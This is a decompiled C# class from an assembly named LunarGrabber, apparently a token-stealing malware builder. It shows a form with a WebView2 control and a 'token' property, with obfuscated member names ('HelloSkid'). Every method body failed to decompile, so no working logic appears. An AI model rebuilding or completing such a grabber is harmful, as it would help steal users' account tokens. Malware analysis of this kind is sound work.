﻿// Decompiled with JetBrains decompiler
// Type: FC5B0025
// Assembly: LunarGrabber, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8F156DE2-B4D0-4210-84CA-FF98CDA75F13
// Assembly location: C:\Users\jayde\OneDrive\Desktop\CT-Dev.MT\ZeroStance\Grabbers (Builders)\LunarGrabber_v2\LunarGrabber.exe

using Microsoft.Web.WebView2.Core;
using System;
using System.ComponentModel;
using System.Windows.Forms;

public class FC5B0025 : Form
{
  private int HelloSkid;
  private IContainer HelloSkid;
  private Microsoft.Web.WebView2.WinForms.WebView2 HelloSkid;

  private string token
  {
    get
    {
      // ISSUE: unable to decompile the method.
    }
    set
    {
      // ISSUE: unable to decompile the method.
    }
  }

  public FC5B0025(string HelloSkid)
  {
    // ISSUE: unable to decompile the method.
  }

  private void HelloSkid(
    object HelloSkid,
    CoreWebView2InitializationCompletedEventArgs HelloSkid)
  {
    // ISSUE: unable to decompile the method.
  }

  private void HelloSkid(object HelloSkid, CoreWebView2NavigationCompletedEventArgs HelloSkid)
  {
    // ISSUE: unable to decompile the method.
  }

  private void HelloSkid(object HelloSkid, EventArgs HelloSkid)
  {
    // ISSUE: unable to decompile the method.
  }

  protected override void Dispose(bool HelloSkid)
  {
    // ISSUE: unable to decompile the method.
  }

  private void HelloSkid()
  {
    // ISSUE: unable to decompile the method.
  }
}
